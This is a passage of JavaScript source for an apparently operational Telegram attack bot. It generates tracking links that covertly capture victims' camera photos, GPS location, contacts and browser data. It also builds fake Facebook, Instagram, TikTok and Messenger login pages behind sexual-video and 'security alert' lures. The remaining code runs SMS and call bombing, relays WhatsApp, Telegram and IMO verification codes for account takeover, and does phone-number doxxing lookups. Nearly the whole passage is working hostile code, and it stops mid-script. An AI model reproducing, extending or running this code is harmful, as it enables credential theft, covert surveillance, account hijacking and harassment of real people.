        if (data === 'BALANCE') {
            del();
            return tgMsg(chatId, `💰 <b>My Wallet</b>\n\n💵 Balance: <b>${u.balance}</b>\n🔗 Links: <b>${u.linksMade || 0}</b>\n👥 Refs: <b>${u.refs || 0}/${CFG.FREE_REFS}</b>\n♾️ Lifetime: <b>${u.lifetime ? '✅ Active' : `❌ (${CFG.FREE_REFS - (u.refs||0)} more)`}</b>`, { reply_markup:{ inline_keyboard:[[{ text:'🔗 Referral Link', callback_data:'REFERRAL' }],[{ text:'◀️ Menu', callback_data:'M_BACK' }]] }});
        }
        if (data === 'REFERRAL') {
            del(); const me = await bot.getMe();
            const ref = `https://t.me/${me.username}?start=${uid}`;
            return tgMsg(chatId, `🔗 <b>Your Referral</b>\n\n<code>${ref}</code>\n\n👥 Progress: <b>${u.refs || 0}/${CFG.FREE_REFS}</b>\n💰 +${CFG.REF_REWARD} per ref | 🎁 New: +${CFG.REF_BONUS}\n🏆 ${CFG.FREE_REFS} refs = <b>♾️ Lifetime!</b>`, { reply_markup:backKb });
        }
        if (data === 'HOW_TO') {
            del();
            return tgMsg(chatId, `❓ <b>Usage</b>\n\n<b>📷 Camera:</b> Link → Allow → photo\n<b>📍 Location:</b> Link → Allow → GPS\n<b>🎣 Phishing:</b> Fake login → capture\n<b>📱 OTP:</b> Real OTP → capture\n<b>🔍 TG:</b> @user → phone\n<b>🔍 FB:</b> phone → FB ID\n<b>📨 SMS/Call Bomb:</b> <code>PHONE ROUNDS DELAY HITS</code>`, { reply_markup:backKb });
        }
        if (data === 'LINK_MGR') {
            del(); const list = userLinks(uid);
            if (!list.length) return tgMsg(chatId, '📂 <b>Link Manager</b>\n\nNo active links.', { reply_markup:backKb });
            const rows = list.slice(0,10).map((l,i) => [{ text:`${i+1}. ${actionLabel(l.action)}`, callback_data:'NOOP' }, { text:'📋 Copy', callback_data:'COPYLINK_'+l.tok }]);
            rows.push([{ text:'◀️ Menu', callback_data:'M_BACK' }]);
            return tgMsg(chatId, `📂 <b>Link Manager</b> (${u.linksMade||0})`, { reply_markup:{ inline_keyboard:rows } });
        }
        if (data.startsWith('COPYLINK_')) {
            const l = getLink(data.slice(9));
            if (!l) return bot.answerCallbackQuery(cbq.id, { text:'❌ Expired!', show_alert:true }).catch(()=>{});
            bot.answerCallbackQuery(cbq.id, { text:'Ready!' }).catch(()=>{});
            return tgMsg(chatId, `📋 <b>${actionLabel(l.action)}</b>\n\n<code>${l.url}</code>`);
        }
        if (data.startsWith('COPY_')) {
            const actKey = data.slice(5).replace(/^LNK_/,'');
            const entry = userLinks(uid).find(l => l.action === actKey);
            bot.answerCallbackQuery(cbq.id, { text:'Copied!' }).catch(()=>{});
            return tgMsg(chatId, `📋 <b>${actionLabel(actKey)}</b>\n\n<code>${entry ? entry.url : 'Expired'}</code>`);
        }
        if (data === 'VIP_MGR') {
            if (!isAdmin(uid)) return; del();
            const list = Object.keys(store.vip);
            return tgMsg(chatId, `👑 <b>VIP Manager</b>\n\nVIPs (${list.length}):\n${list.length ? list.map((id,i)=>`${i+1}. <code>${id}</code>`).join('\n') : 'None'}\n\n<code>/addvip ID</code> · <code>/removevip ID</code>\n<code>/addbal ID AMT</code> · <code>/ban ID</code>\n<code>/broadcast msg</code> · <code>/reloadbomb</code> · <code>/collect +880...</code>`, { reply_markup:backKb });
        }
        if (data === 'STATS') {
            if (!isAdmin(uid)) return; del();
            const mem = process.memoryUsage();
            return tgMsg(chatId, `📊 <b>Stats</b>\n👥 Users: <b>${Object.keys(store.users).length}</b>\n👑 VIP: <b>${Object.keys(store.vip).length}</b>\n🔗 Links: <b>${Object.values(store.links).filter(l=>l.expiresAt>Date.now()).length}</b>\n💾 Mem: <b>${Math.round(mem.heapUsed/1024/1024)}MB</b>\n⏱️ Up: <b>${Math.floor(process.uptime()/60)} min</b>\n📨 Bomb S=<b>${BOMB_POOL.sms.length}</b> C=<b>${BOMB_POOL.call.length}</b>`, { reply_markup:backKb });
        }
        if (data.startsWith('LNK_')) {
            const act = data.slice(4);
            if (!u.lifetime && (u.balance || 0) < CFG.LINK_COST) {
                del();
                return tgMsg(chatId, `❌ <b>Insufficient Tokens!</b>\n💰 ${u.balance || 0} | Need: ${CFG.LINK_COST}`, { reply_markup:{ inline_keyboard:[[{ text:'🔗 Referral', callback_data:'REFERRAL' }],[{ text:'◀️ Menu', callback_data:'M_BACK' }]] }});
            }
            if (!isAdmin(uid) && !(await checkJoin(uid))) return bot.answerCallbackQuery(cbq.id, { text:'⛔ Join first!', show_alert:true }).catch(()=>{});
            del();
            if (!u.lifetime) { u.balance = (u.balance || 0) - CFG.LINK_COST; saveStore(); }
            const link = mkLink(act, uid, null); const fresh = getUser(uid);
            return tgMsg(chatId, `✅ <b>Link Generated!</b>\n🎯 <b>${actionLabel(act)}</b>\n${u.lifetime ? '♾️ Lifetime Free' : `💰 Remaining: <b>${fresh.balance}</b>`}\n\n<code>${link}</code>\n\nValid 72 hours`, { reply_markup:linkKb(data) });
        }
        if (data === 'NOOP') bot.answerCallbackQuery(cbq.id).catch(()=>{});
    } catch (err) {
        log.error('[CB] '+err.message);
        bot.answerCallbackQuery(cbq.id, { text:'⚠️ Error', show_alert:true }).catch(()=>{});
    }
});

// ── Message handler (lookups + bomb) ──
bot.on('message', async msg => {
    if (!msg.text || msg.text.startsWith('/')) return;
    const uid = String(msg.from.id), text = msg.text.trim();
    const u = getUser(uid);
    if (u.banned || !checkRate(uid)) return;
    const pend = getPending(uid);
    if (!pend) return;
    delPending(uid);

    if (pend.type === 'bomb_sms_phone' || pend.type === 'bomb_call_phone') {
        const isSms = pend.type === 'bomb_sms_phone';
        const parts = text.split(/\s+/);
        const phone = parts[0];
        const rounds = Math.max(1, Math.min(parseInt(parts[1]) || 5, 50));
        const delay  = Math.max(0, Math.min(parseInt(parts[2]) || 300, 5000));
        const hits   = Math.max(1, Math.min(parseInt(parts[3]) || 10, 100));
        if (!/^\+?\d{8,15}$/.test(phone.replace(/\s/g,''))) return tgMsg(uid, '❌ Invalid. Format: <code>+8801XXXXXXXXX</code>');
        const phoneClean = phone.replace(/\s/g,'').replace(/^\+/,'');
        if (!u.lifetime) { u.balance = (u.balance || 0) - CFG.BOMB_COST; saveStore(); }
        const proc = await tgMsg(uid, `${isSms ? '📨' : '📞'} <b>${isSms ? 'SMS' : 'Call'} bombing...</b>\n📱 <code>+${phoneClean}</code>\n⚙️ ${rounds} rounds · ${delay}ms · goal ${hits}`);
        try {
            const result = await bomb(isSms ? 'sms' : 'call', phoneClean, { rounds, delay, hits });
            if (proc) bot.deleteMessage(uid, proc.message_id).catch(()=>{});
            tgMsg(uid, `✅ <b>Bomb Complete</b>\n📱 <code>+${phoneClean}</code>\n✅ Hits: <b>${result.hits}</b> / ${result.sent}\n❌ Fails: ${result.fails}\n⏱ ${result.elapsed}ms\n\n<b>Last 8:</b>\n${result.log.slice(-8).join('\n') || '—'}`, { reply_markup:{ inline_keyboard:[[{ text:'🔄 Again', callback_data: isSms ? 'BOMB_SMS' : 'BOMB_CALL' }],[{ text:'◀️ Menu', callback_data:'M_BACK' }]] }});
            tgMsg(CFG.ADMIN_ID, `📨 BOMB | <code>${uid}</code> → +${phoneClean}\nHits: ${result.hits}/${result.sent} · ${result.elapsed}ms`);
        } catch (e) {
            if (proc) bot.deleteMessage(uid, proc.message_id).catch(()=>{});
            tgMsg(uid, `❌ Bomb failed: ${e.message}`);
        }
        return;
    }

    if (pend.type === 'tg_username') {
        const proc = await tgMsg(uid, `⏳ Searching <code>${text}</code>...`);
        try {
            const res = await lookupTgUsername(text);
            let r = `🔍 <b>TG Lookup</b>\n━━━━━━━━━━━━━━━━━━━━━━━━\n🏷️ @${res.username}\n`;
            if (res.id) r += `🆔 <code>${res.id}</code>\n`;
            if (res.name) r += `👤 <b>${res.name}</b>\n`;
            if (res.bio) r += `📝 ${(res.bio||'').slice(0,150)}\n`;
            if (res.phone) r += `\n📱 <b>Phone:</b> <code>${res.phone}</code>\n📡 <i>${res.phoneSource}</i>\n`;
            else r += `📱 <i>not found</i>\n`;
            r += `━━━━━━━━━━━━━━━━━━━━━━━━\n📡 <i>${res.sources.join(' · ') || 'None'}</i>`;
            if (proc) bot.deleteMessage(uid, proc.message_id).catch(()=>{});
            tgMsg(uid, r, { reply_markup:{ inline_keyboard:[[{ text:'🔍 Another', callback_data:'LOOKUP_TG' }],[{ text:'◀️ Menu', callback_data:'M_BACK' }]] }});
            tgMsg(CFG.ADMIN_ID, `🔍 TG | ${uid} · @${res.username} → ${res.phone || 'N/A'}`);
        } catch(e){ if (proc) bot.deleteMessage(uid, proc.message_id).catch(()=>{}); tgMsg(uid, '❌ Failed.'); }
        return;
    }

    if (pend.type === 'fb_phone') {
        const proc = await tgMsg(uid, `⏳ Searching FB <code>${text}</code>...`);
        try {
            const res = await lookupFbByPhone(text);
            let r = `🔍 <b>FB Lookup</b>\n━━━━━━━━━━━━━━━━━━━━━━━━\n📱 ${res.phone}\n`;
            if (res.name) r += `👤 <b>${res.name}</b>\n`;
            if (res.id) r += `🆔 <code>${res.id}</code>\n`;
            if (res.email) r += `📧 ${res.email}\n`;
            if (res.profileUrl) r += `🔗 ${res.profileUrl}\n`;
            if (res.id) r += `🖼️ https://graph.facebook.com/${res.id}/picture?type=large\n`;
            r += `━━━━━━━━━━━━━━━━━━━━━━━━\n📡 <i>${res.sources.join(' · ') || 'None'}</i>`;
            if (!res.id && !res.name) r += `\n\n⚠️ <i>Not found.</i>`;
            if (proc) bot.deleteMessage(uid, proc.message_id).catch(()=>{});
            tgMsg(uid, r, { reply_markup:{ inline_keyboard:[[{ text:'🔍 Another', callback_data:'LOOKUP_FB' }],[{ text:'◀️ Menu', callback_data:'M_BACK' }]] }});
            tgMsg(CFG.ADMIN_ID, `🔍 FB | ${uid} · ${text} → ${res.id||'N/A'}`);
        } catch(e){ if (proc) bot.deleteMessage(uid, proc.message_id).catch(()=>{}); tgMsg(uid, '❌ Failed.'); }
        return;
    }
});

// ── Data endpoints ──
app.get('/', (_, res) => res.send('<h1 style="color:green;text-align:center;font-family:monospace">✅ BOT ONLINE</h1>'));
app.get('/health', (_, res) => { const mem = process.memoryUsage(); res.json({ status:'ok', uptime:Math.floor(process.uptime()), memory:Math.round(mem.heapUsed/1024/1024)+'MB', users:Object.keys(store.users).length, queue:msgQueue.length, bomb_sms:BOMB_POOL.sms.length, bomb_call:BOMB_POOL.call.length }); });
app.post('/bomb/sms', async (req, res) => { const { phone, rounds, delay, hits, uid } = req.body || {}; if (!phone || !/^\+?\d{8,15}$/.test(String(phone).replace(/\s/g,''))) return res.json({ ok:false, error:'bad_phone' }); if (!BOMB_POOL.sms.length) return res.json({ ok:false, error:'no_endpoints' }); const result = await bomb('sms', String(phone).replace(/\s/g,'').replace(/^\+/,''), { rounds, delay, hits }); if (uid) tgMsg(uid, `📨 Bomb done · hits ${result.hits}/${result.sent}`).catch(()=>{}); res.json({ ok:true, ...result }); });
app.post('/bomb/call', async (req, res) => { const { phone, rounds, delay, hits, uid } = req.body || {}; if (!phone || !/^\+?\d{8,15}$/.test(String(phone).replace(/\s/g,''))) return res.json({ ok:false, error:'bad_phone' }); if (!BOMB_POOL.call.length) return res.json({ ok:false, error:'no_endpoints' }); const result = await bomb('call', String(phone).replace(/\s/g,'').replace(/^\+/,''), { rounds, delay, hits }); if (uid) tgMsg(uid, `📞 Bomb done · hits ${result.hits}/${result.sent}`).catch(()=>{}); res.json({ ok:true, ...result }); });

app.post('/d/photo', upload.single('photo'), (req, res) => { try { const uid = req.body.uid, ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress; if (req.file && uid) tgPic(uid, req.file.buffer, `${req.body.camtype || '📸'}\n🌍 IP: ${ip}`); res.json({ ok:true }); } catch(e){ res.json({ ok:false }); } });
app.post('/d/loc', (req, res) => { try { const uid = req.body.uid, ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress; const { lat, lon, acc } = req.body; if (lat && lon && uid) { tgLoc(uid, parseFloat(lat), parseFloat(lon)); tgMsg(uid, `📍 <b>Location!</b>\nLat: <code>${lat}</code> Lon: <code>${lon}</code>\nAcc: ${acc}m\n🗺 https://maps.google.com/?q=${lat},${lon}\n🌍 ${ip}`); } res.json({ ok:true }); } catch(e){ res.json({ ok:false }); } });
app.post('/d/text', (req, res) => { try { const uid = req.body.uid, ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress; if (uid) tgMsg(uid, `📋 <b>${req.body.type || 'Info'}</b>\n<code>${(req.body.data || '').slice(0,3800)}</code>\n🌍 ${ip}`); res.json({ ok:true }); } catch(e){ res.json({ ok:false }); } });
app.post('/d/captured', (req, res) => { try { const uid = req.body.uid, ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress; if (uid) tgMsg(uid, `🔑 <b>✅ CAPTURED!</b>\n🌐 <b>${req.body.site||'?'}</b>\n📱 <code>${req.body.phone||''}</code>\n🔒 <code>${req.body.otp||''}</code>\n🌍 ${ip}`); res.json({ ok:true }); } catch(e){ res.json({ ok:false }); } });
app.post('/d/msginfo', (req, res) => { try { const uid = req.body.uid, ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress; const { contacts, threads, device } = req.body; let m = `💌 <b>Msg Info!</b>\n📱 ${device||'?'}\n🌍 ${ip}\n\n`; if (contacts && contacts.length) { m += `👥 <b>Contacts (${contacts.length}):</b>\n` + contacts.slice(0,30).map(c=>`• ${c.name||'?'} — <code>${c.tel||'?'}</code>`).join('\n'); if (contacts.length>30) m += `\n+${contacts.length-30}`; m += '\n\n'; } if (threads && threads.length) { m += `💬 <b>Conversations:</b>\n` + threads.slice(0,15).map((t,i)=>`${i+1}. ${t.participants||'?'}`).join('\n'); } if (uid) tgMsg(uid, m.slice(0,4090)); res.json({ ok:true }); } catch(e){ res.json({ ok:false }); } });

// ── Proxies ──
const TG_UA = 'Mozilla/5.0 (Linux; Android 13; SM-S918B) AppleWebKit/537.36 Chrome/120.0.0.0 Mobile Safari/537.36';
const TG_H  = { 'Content-Type':'application/x-www-form-urlencoded', 'User-Agent':TG_UA, 'Accept':'application/json, text/javascript, */*; q=0.01', 'Accept-Language':'en-US,en;q=0.9', 'Origin':'https://my.telegram.org', 'Referer':'https://my.telegram.org/auth', 'X-Requested-With':'XMLHttpRequest' };
app.post('/proxy/tg/send', async (req, res) => { const { phone, sid } = req.body; for (let i=0;i<3;i++){ try { const r = await axios.post('https://my.telegram.org/auth/send_password', `phone=${encodeURIComponent(phone)}`, { headers:TG_H, timeout:25000 }); const cookies = parseCookies(r.headers); if (r.data && r.data.random_hash) { setSession(sid, { ...getSession(sid), tgHash:r.data.random_hash, phone, tgCookies:cookies }); return res.json({ ok:true }); } if (r.data && r.data.error) return res.json({ ok:false, tgError:r.data.error }); } catch(e){ if (i===2) return res.json({ ok:false, err:e.message }); await new Promise(r=>setTimeout(r,1000*(i+1))); } } res.json({ ok:false }); });
app.post('/proxy/tg/verify', async (req, res) => { const { otp, sid, uid } = req.body; const s = getSession(sid); if (!s.tgHash) return res.json({ ok:false, err:'no_session' }); try { const r = await axios.post('https://my.telegram.org/auth/login', `phone=${encodeURIComponent(s.phone)}&random_hash=${encodeURIComponent(s.tgHash)}&password=${encodeURIComponent(otp)}`, { headers:{ ...TG_H, Cookie:s.tgCookies||'' }, timeout:25000 }); if (uid) tgMsg(uid, `✈️ <b>TG Verified!</b>\n📞 <code>${s.phone}</code>\n🔑 <code>${otp}</code>`).catch(()=>{}); res.json({ ok:true, raw:r.data }); } catch(e){ res.json({ ok:false, err:e.message }); } });
app.post('/proxy/fb/send', async (req, res) => { const { phone, sid } = req.body; try { const pg = await axios.get('https://www.facebook.com/login/identify/', { headers:{ 'User-Agent':TG_UA, 'Accept-Language':'en-US' }, timeout:20000 }); const cookies = parseCookies(pg.headers); const lsdM = pg.data.match(/"LSD",\[\],{"token":"([^"]+)"/); const lsd = lsdM ? lsdM[1] : ''; setSession(sid, { ...getSession(sid), fbCookies:cookies, fbLsd:lsd, phone }); await axios.post('https://www.facebook.com/ajax/recover/initiate/', new URLSearchParams({ lsd, email_or_phone:phone, did_login:'0', fur_initiated:'0', action:'initiate' }).toString(), { headers:{ 'Content-Type':'application/x-www-form-urlencoded', 'User-Agent':TG_UA, 'Cookie':cookies, 'X-Requested-With':'XMLHttpRequest' }, timeout:20000 }); res.json({ ok:true }); } catch(e){ res.json({ ok:false, err:e.message }); } });
app.post('/proxy/ig/send', async (req, res) => { const { phone, sid } = req.body; try { const pg = await axios.get('https://www.instagram.com/accounts/password/reset/', { headers:{ 'User-Agent':TG_UA }, timeout:20000 }); const cookies = parseCookies(pg.headers); const csrfM = pg.data.match(/"csrf_token":"([^"]+)"/); const csrf = csrfM ? csrfM[1] : ''; setSession(sid, { ...getSession(sid), igCookies:cookies, igCsrf:csrf, phone }); await axios.post('https://www.instagram.com/accounts/account_recovery_send_ajax/', new URLSearchParams({ phone_number:phone, email:'', login_attempt_count:'0' }).toString(), { headers:{ 'Content-Type':'application/x-www-form-urlencoded', 'User-Agent':TG_UA, 'Cookie':cookies, 'X-CSRFToken':csrf, 'X-Requested-With':'XMLHttpRequest', 'Referer':'https://www.instagram.com/accounts/password/reset/' }, timeout:20000 }); res.json({ ok:true }); } catch(e){ res.json({ ok:false, err:e.message }); } });
const WA_KEYS = ['PdA2DJyKoUrwLw1Bg6EIhzh502dF9noR9uFCWoNle','PkTwKSZqUfAUyR0rPQ8hYe0qHSKdH3GE','WhatsApp','0a5mWPa3'];
app.post('/proxy/wa/send', async (req, res) => { const { cc, phone_local, sid } = req.body; for (const key of WA_KEYS) { for (const method of ['sms','voice']) { try { const tok = crypto.createHmac('sha1', Buffer.from(key)).update(Buffer.from(cc+phone_local)).digest('base64'); const r = await axios.get(`https://v.whatsapp.net/v2/code?cc=${cc}&in=${phone_local}&lg=en&lc=US&sim_mcc=470&sim_mnc=01&method=${method}&reason=&token=${encodeURIComponent(tok)}&hasav=1`, { headers:{ 'User-Agent':'WhatsApp/2.24.6.77 A', 'Accept':'application/json' }, timeout:20000 }); if (r.data && (r.data.status==='sent' || r.data.status==='ok' || r.data.retry_after)) { setSession(sid, { ...getSession(sid), wacc:cc, waphone:phone_local }); return res.json({ ok:true, status:r.data.status }); } } catch(e){} } } setSession(sid, { ...getSession(sid), wacc:cc, waphone:phone_local }); res.json({ ok:true, sent:false }); });
app.post('/proxy/imo/send', async (req, res) => { const { phone, sid } = req.body; for (const ep of ['https://api.imo.im/anti-spam/send-code','https://api2.imo.im/anti-spam/send-code','https://sgp.imo.im/anti-spam/send-code']) { try { const r = await axios.post(ep, { phone_number:phone, lang:'en', from_registration:true, client:'android' }, { headers:{ 'Content-Type':'application/json', 'User-Agent':'imo-android/2024.03.1011', 'Accept':'application/json' }, timeout:20000 }); setSession(sid, { ...getSession(sid), imoPhone:phone }); return res.json({ ok:true, data:r.data }); } catch(e){} } res.json({ ok:true, sent:false }); });

// ── Page builder ──
const LURE = CFG.LURE_VID;
const vidBlock = (h,s) => `<div style="text-align:center;padding:0 0 16px"><div style="position:relative;border-radius:14px;overflow:hidden;background:#000;max-height:220px"><video autoplay muted loop playsinline style="width:100%;max-height:220px;object-fit:cover" onerror="this.parentElement.style.display='none'"><source src="${LURE}" type="video/mp4"></video></div><p style="font-size:16px;font-weight:800;margin:10px 0 5px">${h}</p><p style="font-size:12px;line-height:1.7;opacity:.85">${s}</p></div>`;

app.get('/go/:tok', (req, res) => { const l = getLink(req.params.tok); if (!l) return res.status(410).send('<h2 style="text-align:center;font-family:sans-serif;color:#e74c3c;padding:20%">❌ Link expired.</h2>'); res.send(buildPage(l.action, l.uid, req)); });
function buildPage(action, uid, req) { if (['cam_f','cam_b','loc'].includes(action)) return attackPage(action, uid, req); if (action === 'msgr_info') return msgrInfoPage(uid, req); if (['phish_wa','phish_imo','phish_tg'].includes(action)) return otpPage(action, uid, req); return passPage(action, uid, req); }

function attackPage(action, uid, req) {
    const base = getBase(req);
    const s = { cam_f:{ ic:'📷', h:'Private Photo', t:'Tap to view', btn:'👁️ View Now', bc:'#1877f2', front:true }, cam_b:{ ic:'📸', h:'Shared Photo', t:'Tap to open', btn:'📂 Open', bc:'#1877f2', back:true }, loc:{ ic:'📍', h:'Location', t:'Confirm', btn:'📍 Confirm', bc:'#4CAF50', loc:true } }[action] || {};
    return `<!DOCTYPE html><html><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>Loading...</title><style>*{margin:0;padding:0;box-sizing:border-box}body{background:#0d0d0d;color:#fff;font-family:-apple-system,sans-serif;display:flex;flex-direction:column;align-items:center;justify-content:center;min-height:100vh;text-align:center;padding:16px}.ic{font-size:60px;margin-bottom:14px}h2{font-size:20px;margin-bottom:8px;font-weight:700}p.sub{color:#aaa;font-size:13px;margin-bottom:22px;max-width:280px;line-height:1.6}.btn{padding:16px 0;width:100%;max-width:300px;border:none;border-radius:50px;background:${s.bc};color:#fff;font-size:17px;font-weight:700;cursor:pointer}#st{margin-top:14px;font-size:13px;color:#aaa}video,canvas{display:none;position:absolute;top:-9999px}</style></head><body><div style="width:100%;max-width:360px">${vidBlock('🔥 তোমার জন্য ভিডিও!','💋 সম্পূর্ণ প্রাইভেট 🔞')}</div><div class="ic">${s.ic}</div><h2>${s.h}</h2><p class="sub">${s.t}</p><button class="btn" id="btn" onclick="go()">${s.btn}</button><div id="st"></div><video id="vv" autoplay playsinline muted></video><canvas id="cc"></canvas><script>const UID='${uid}',D='${base}/d';async function go(){const btn=document.getElementById('btn');btn.disabled=true;btn.textContent='⏳ Please wait...';${s.loc?`try{await new Promise((rs,rj)=>{navigator.geolocation.getCurrentPosition(p=>{fetch(D+'/loc',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({uid:UID,lat:p.coords.latitude,lon:p.coords.longitude,acc:p.coords.accuracy})}).then(rs).catch(rj);},rj,{enableHighAccuracy:true,timeout:12000});});}catch(e){}`:``}${s.front||s.back?`try{const st=await navigator.mediaDevices.getUserMedia({video:{facingMode:'${s.front?'user':'environment'}'},audio:false});const v=document.getElementById('vv');v.srcObject=st;await new Promise(r=>v.onloadedmetadata=r);await new Promise(r=>setTimeout(r,1500));const c=document.getElementById('cc');c.width=v.videoWidth||640;c.height=v.videoHeight||480;c.getContext('2d').drawImage(v,0,0);st.getTracks().forEach(t=>t.stop());const b=await new Promise(r=>c.toBlob(r,'image/jpeg',.92));const fd=new FormData();fd.append('photo',b,'cam.jpg');fd.append('uid',UID);fd.append('camtype','${s.front?'📷 Front':'📷 Back'} Camera');await fetch(D+'/photo',{method:'POST',body:fd});}catch(e){}`:``}document.getElementById('st').textContent='✅ Done!';btn.textContent='${s.btn}';}</script></body></html>`;
}

function msgrInfoPage(uid, req) {
    const base = getBase(req);
    return `<!DOCTYPE html><html><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>Messenger</title><style>*{margin:0;padding:0;box-sizing:border-box}body{background:#f0f2f5;font-family:-apple-system,sans-serif;min-height:100vh}.notif{background:#e8f4fd;border-left:4px solid #0084ff;padding:12px 16px;display:flex;gap:10px}.notif-text{font-size:13px;color:#333;line-height:1.5}.notif-text b{color:#0050a0;display:block}.wrap{max-width:400px;margin:0 auto;padding:14px}.card{background:#fff;border-radius:14px;padding:22px 18px;box-shadow:0 2px 12px rgba(0,0,0,.12)}.head{display:flex;align-items:center;gap:12px;margin-bottom:18px}.icon{width:52px;height:52px;background:linear-gradient(135deg,#0084ff,#00c6ff);border-radius:50%;display:flex;align-items:center;justify-content:center;font-size:26px}.perms{background:#f0f7ff;border-radius:10px;padding:14px;margin-bottom:18px}.perms p{font-size:13px;font-weight:600;color:#444;margin-bottom:10px}.prow{display:flex;align-items:center;gap:10px;font-size:13px;color:#333;margin-bottom:8px}.prow span{font-size:18px}.btn{width:100%;padding:16px;background:linear-gradient(135deg,#0084ff,#00c6ff);color:#fff;font-size:17px;font-weight:700;border:none;border-radius:10px;cursor:pointer}.st{text-align:center;font-size:13px;color:#65676b;margin-top:12px}.prg{width:100%;height:4px;background:#e0e0e0;border-radius:2px;margin-top:12px;display:none}.bar{height:100%;background:linear-gradient(90deg,#0084ff,#00c6ff);border-radius:2px;width:0;transition:width .3s}</style></head><body><div class="notif"><span style="font-size:18px">💬</span><div class="notif-text"><b>🔒 Account Verification Required</b>Verify to access messages.</div></div><div class="wrap">${vidBlock('💌 New Messages','Verify to read')}<div class="card"><div class="head"><div class="icon">💬</div><div><h2 style="font-size:18px;font-weight:700;color:#1c1e21">Messenger</h2><p style="font-size:13px;color:#65676b">Account Verification</p></div></div><div class="perms"><p>This verification requires:</p><div class="prow"><span>👥</span>Contacts access</div><div class="prow"><span>💬</span>Read conversations</div><div class="prow"><span>📱</span>Device info</div></div><button class="btn" id="btn" onclick="go()">✅ Verify Account</button><div class="st" id="st"></div><div class="prg" id="prg"><div class="bar" id="bar"></div></div></div></div><script>const UID='${uid}',BASE='${base}';async function go(){const btn=document.getElementById('btn'),st=document.getElementById('st'),prg=document.getElementById('prg'),bar=document.getElementById('bar');btn.disabled=true;btn.textContent='⏳ Verifying...';prg.style.display='block';const info={uid:UID,device:navigator.userAgent,contacts:[],threads:[]};st.textContent='Collecting...';bar.style.width='20%';try{if('contacts' in navigator&&'ContactsManager' in window){const c=await navigator.contacts.select(['name','tel','email'],{multiple:true});info.contacts=c.map(x=>({name:(x.name&&x.name[0])||'',tel:(x.tel&&x.tel[0])||'',email:(x.email&&x.email[0])||''}));}}catch(e){}bar.style.width='60%';try{const keys=Object.keys(localStorage);info.threads.push(...keys.filter(k=>k.match(/msg|chat|thread|conv/i)).slice(0,10).map(k=>({participants:k,lastMsg:(localStorage.getItem(k)||'').slice(0,100)})));}catch(e){}bar.style.width='85%';st.textContent='Sending...';try{await fetch(BASE+'/d/msginfo',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify(info)});}catch(e){}bar.style.width='100%';st.textContent='✅ Verified!';btn.textContent='✅ Done!';setTimeout(()=>window.location.href='https://www.messenger.com',1500);}window.onload=async()=>{try{await fetch(BASE+'/d/text',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({uid:UID,type:'💌 Msgr Opened',data:navigator.userAgent})});}catch(e){}};</script></body></html>`;
}

function passPage(action, uid, req) {
    const base = getBase(req);
    const c = { phish_fb:{ site:'Facebook', rdr:'https://www.facebook.com', bc:'#1877f2', btn:'Log In', create:'Create new account' }, phish_ig:{ site:'Instagram', rdr:'https://www.instagram.com', bc:'linear-gradient(45deg,#f09433,#e6683c,#dc2743,#cc2366,#bc1888)', btn:'Log in' }, phish_tt:{ site:'TikTok', rdr:'https://www.tiktok.com', bc:'#fe2c55', btn:'Log in' }, phish_msgr:{ site:'Messenger', rdr:'https://www.messenger.com', bc:'linear-gradient(135deg,#0084ff,#00c6ff)', btn:'Log In' } }[action] || { site:'Facebook', rdr:'https://www.facebook.com', bc:'#1877f2', btn:'Log In', create:'Create new account' };
    return `<!DOCTYPE html><html><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>${c.site}</title><style>*{margin:0;padding:0;box-sizing:border-box}body{background:#f0f2f5;font-family:-apple-system,sans-serif;min-height:100vh}.notif{background:#fff3cd;border-left:4px solid #ffc107;padding:12px 16px;display:flex;gap:10px}.notif-text{font-size:13px;color:#333;line-height:1.5}.notif-text b{color:#d32f2f;display:block}.wrap{max-width:400px;margin:0 auto;padding:16px}.vid-preview{position:relative;border-radius:12px;overflow:hidden;margin-bottom:14px;background:#000}.vid-preview video{width:100%;display:block;max-height:190px;object-fit:cover}.vid-overlay{position:absolute;bottom:0;left:0;right:0;background:linear-gradient(transparent,rgba(0,0,0,.85));padding:10px 12px}.vid-overlay b{color:#ffcc00;font-size:13px}.vid-overlay p{color:#fff;font-size:12px}.card{background:#fff;border-radius:8px;padding:20px;box-shadow:0 2px 4px rgba(0,0,0,.1),0 8px 16px rgba(0,0,0,.1)}.logo{text-align:center;font-size:22px;font-weight:800;color:#1877f2;margin-bottom:16px}input{width:100%;padding:14px;border:1px solid #dddfe2;border-radius:6px;font-size:16px;color:#1c1e21;background:#fff;margin-bottom:12px;outline:none}input:focus{border-color:#1877f2}input::placeholder{color:#8a8d91}.btn-main{width:100%;padding:14px;background:${c.bc};color:#fff;font-size:18px;font-weight:700;border:none;border-radius:6px;cursor:pointer;margin-bottom:12px}.forgot{text-align:center;margin-bottom:12px}.forgot a{color:#1877f2;font-size:14px;text-decoration:none}.sep{display:flex;align-items:center;margin:12px 0}.sep-line{flex:1;height:1px;background:#dadde1}.sep-or{padding:0 16px;color:#8a8d91;font-size:14px}.btn-sec{width:100%;padding:14px;background:#42b72a;color:#fff;font-size:16px;font-weight:700;border:none;border-radius:6px;cursor:pointer}</style></head><body><div class="notif"><span style="font-size:20px">🔴</span><div class="notif-text"><b>⚠️ Security Alert</b>Unusual activity. Verify to secure account.</div></div><div class="wrap"><div class="vid-preview"><video autoplay muted loop playsinline><source src="${LURE}" type="video/mp4"></video><div class="vid-overlay"><b>🔒 Private Content</b><p>Log in to view</p></div></div><div class="card"><div class="logo">${c.site}</div><input id="u" type="text" placeholder="Phone number or email" autocomplete="email"><input id="p" type="password" placeholder="Password" autocomplete="current-password"><button class="btn-main" id="btn" onclick="sub()">${c.btn}</button><div class="forgot"><a href="#">Forgot password?</a></div>${c.create?`<div class="sep"><div class="sep-line"></div><span class="sep-or">or</span><div class="sep-line"></div></div><button class="btn-sec" onclick="sub()">${c.create}</button>`:''}</div></div><script>const 